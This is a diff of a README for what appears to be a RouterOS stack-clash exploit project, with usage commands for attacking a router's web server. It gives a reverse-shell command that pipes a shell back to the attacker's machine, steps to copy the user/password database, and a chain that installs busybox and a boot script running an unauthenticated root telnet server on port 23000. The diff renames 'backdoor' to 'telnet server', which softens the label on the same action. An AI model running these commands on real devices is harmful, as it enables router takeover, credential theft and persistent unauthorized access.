@@ -28,7 +28,7 @@ $ ./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_binary
 ## StackClash_x86  
 Stack clash exploit using two threads  with ROP chain to run bash commands  
 
-### For a reverse shell:  
+### Reverse shell:  
 In a shell:  
 ```
 $ nc -l -p 1234 
@@ -41,7 +41,7 @@ Where:
 - RouterOS IP: 192.168.8.1  
 - PC IP: 192.168.8.5  
 
-### To extract users and passwords
+### Extract users and passwords
 ```
 $ ./StackClash_x86.py 192.168.8.1 80 www_binary "cp /rw/store/user.dat /ram/winbox.idx"
 $ sleep 3 # (wait some seconds that www is restarted)
@@ -91,19 +91,21 @@ $ ./StackClash_mips.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/teln
 and wait until the connection automatically close.  
 (Once the file is uploaded, run again reverse shell (this time only listening with `nc -l -p 1234`) and you will find busybox inside `/ram/`)
 
-### Persistent backdoor
-Enable persistent telnet server on port 23000  
+### Persistent telnet server  
+You can run script at each boot by creating a bash script in `/flash/etc/rc.d/run.d/`.  
+Pay attention to set execution permissions, or your router will stuck on boot and you will have to restore the firmware!  
+This example enables a persistent telnet server on port 23000.  
 In a shell:
 ```
 $ wget https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-mips 
-$ { echo "echo Installing backdoor..."; hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /flash/bin/busybox\n"' busybox-mips | sed -e "s/\\\\\\\\x  //g"; echo "chmod 777 /flash/bin/busybox"; echo "/flash/bin/busybox --install -s /flash/bin/"; echo "mkdir -p /flash/etc/rc.d/run.d"; echo 'echo -e "#!/flash/bin/sh\ntelnetd -p 23000 -l sh" > /flash/etc/rc.d/run.d/S89own'; echo "chmod 777 /flash/etc/rc.d/run.d/S89own"; echo "/nova/bin/info '/system reboot'"; echo "echo Done! Rebooting..."; } | nc -l -p 1234
+$ { echo "echo Installing..."; hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /flash/bin/busybox\n"' busybox-mips | sed -e "s/\\\\\\\\x  //g"; echo "chmod 777 /flash/bin/busybox"; echo "/flash/bin/busybox --install -s /flash/bin/"; echo "mkdir -p /flash/etc/rc.d/run.d"; echo 'echo -e "#!/flash/bin/sh\ntelnetd -p 23000 -l sh" > /flash/etc/rc.d/run.d/S89own'; echo "chmod 777 /flash/etc/rc.d/run.d/S89own"; echo "/nova/bin/info '/system reboot'"; echo "echo Done! Rebooting..."; } | nc -l -p 1234
 ```
 In another shell (note that this is the reverse shell command):  
 ```
 $ ./StackClash_mips.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f"
 ```
 and wait until `Done! Rebooting...` appears.  
-Once the router is up:
+Once the router is up again:
 ```
 $ telnet 192.168.8.1 23000
 Trying 192.168.8.1...
